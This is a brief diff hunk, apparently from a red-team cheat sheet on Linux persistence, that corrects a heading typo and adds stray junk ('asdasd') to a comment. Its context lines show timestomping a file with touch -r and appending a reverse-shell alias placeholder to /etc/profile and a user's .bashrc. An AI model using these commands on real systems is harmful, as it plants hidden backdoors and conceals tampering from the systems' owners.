@@ -23,10 +23,10 @@ find / -type f -printf "%T+ %p\n" | grep -v 00000000
 touch original_lib_file -r persistence_file
 ```
 
-#### .rc Aliasign
+#### .rc Aliasing
 
 ```bash
-# If have sudo or permission to propagate to all users
+# If have sudo or permission to propagate to all usersasdasd
 echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /etc/profile
 # consider .zshrc or dash.rc
 echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /home/$USER/.bashrc 
